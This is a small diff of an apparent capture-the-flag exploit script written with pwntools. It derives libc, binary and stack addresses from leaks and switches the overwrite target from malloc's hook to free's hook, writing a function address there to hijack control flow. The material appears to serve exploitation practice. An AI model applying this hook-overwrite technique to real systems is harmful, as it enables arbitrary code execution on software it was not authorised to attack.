@@ -351,7 +351,7 @@ stackLeak = int(s[2], 16)
 binBase = int(s[3], 16) - 0x11b3
 ptrArr = binBase + 0x202080 + 0x8
 symKill = binBase + 0x000010b4
-mallocHook = libcBase + 0x3ed8e8
+freeHook = libcBase + 0x3ed8e8
 
 io.success("libc base addr: " + hex(libcBase))
 io.success("rbp stack leak: " + hex(stackLeak))
@@ -363,7 +363,7 @@ stackControl = stackLeak - 0x70
 # io.info("controlling stack: " + hex(stackControl))
 
 io.recvuntil("Pointer: ")
-io.sendline(str(mallocHook))
+io.sendline(str(freeHook))
 io.recvuntil("Content: ")
 io.send(p64(symKill))
 
